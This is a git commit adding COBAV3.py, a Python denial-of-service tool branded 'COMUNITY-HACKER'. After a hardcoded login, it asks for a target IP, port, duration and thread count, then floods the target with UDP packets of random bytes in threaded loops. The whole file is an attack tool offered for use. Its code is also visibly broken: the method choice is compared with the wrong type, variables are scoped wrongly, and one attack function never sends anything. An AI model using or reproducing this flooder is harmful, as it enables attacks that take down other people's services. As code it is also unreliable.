4f125192f1e78fd43db5b77ffbf174bf2df73bea
RabbitLico123 <163141347+RabbitLico123@users.noreply.github.com>
2024-03-14 00:31:38 +0700

    Add files via upload

---
+++ COBAV3.py
@@ -0,0 +1,172 @@
+import os
+import codecs
+import sys
+import random
+import threading
+import time
+import socket
+from time import time as tt
+
+os.system("clear")
+
+print("""\033[91m
+
+███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
+██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
+███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
+╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
+███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
+""")
+
+username = str(input("\033[94m[COMUNITY-HACKER] \033[93mUsername:"))
+password = str(input("\033[94m[COMUNITY-HACKER] \033[93mPassword:"))
+if password == "123" and username == "123":
+    print ("Kamu Berhasil Masukan Password Silakan Login Atau Kembali")
+    time.sleep(2)
+
+else:
+    print ("Password Yang Kamu Masukan Salah Silakan Login Kembali")
+    time.sleep(2)
+    exit()
+
+os.system("clear")
+print("""\033[92m
+███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
+██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
+███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
+╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
+███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ """)
+time.sleep(5)
+
+
+nicknm = "COMUNITY-HACKER"
+
+mt = """\033[96mUnder \033[0;93mmaintance"""
+
+os.system("clear")
+
+print("""\033[94m
+███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
+██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
+███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
+╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
+███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
+""")
+
+
+ip = str(input("\033[91mEnter The Target IP/Hpst   : "))
+port = int(input("\033[91mEnter The Target PORT   : "))
+time = int(input("\033[91mEnter The Send Packet   : "))
+threads = int(input("\033[91mEnter The Send THREADS   : "))
+choice = int(input("\033[91mEnter The Methode UDP/OVH   : "))
+
+os.system("clear")
+
+brand = """\033[94m
+███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
+██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
+███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
+╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
+███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
+
+\033[91m     discord:https://ComunityHacker.gg/CHK.com
+"""
+
+os.system("clear")
+
+def run1():
+	
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[92m 🔥 GRATIS 🔥")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def run2():
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[92m 🔥 GRATIS🔥")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+def run3():
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[92m 🔥 GRATIS 🔥")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(1024, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+
+for y in range(threads):
+	if choice == 'UDP':
+		th = threading.Thread(target = run1)
+		th.start()
+	if choice == 'OVH':
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		
